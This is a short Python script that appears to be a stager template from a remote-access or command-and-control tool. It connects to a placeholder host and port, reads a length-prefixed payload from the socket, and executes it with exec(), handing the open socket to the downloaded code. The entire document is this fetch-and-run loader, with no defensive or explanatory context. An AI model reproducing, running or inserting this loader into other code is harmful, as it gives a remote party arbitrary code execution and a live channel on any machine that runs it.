import socket

s = socket.create_connection(("$DECLUSOR_HOST", int("$DECLUSOR_PORT")))
f = s.makefile("rb")
exec(f.read(int.from_bytes(f.read(4), "big")), {"_sock": s})
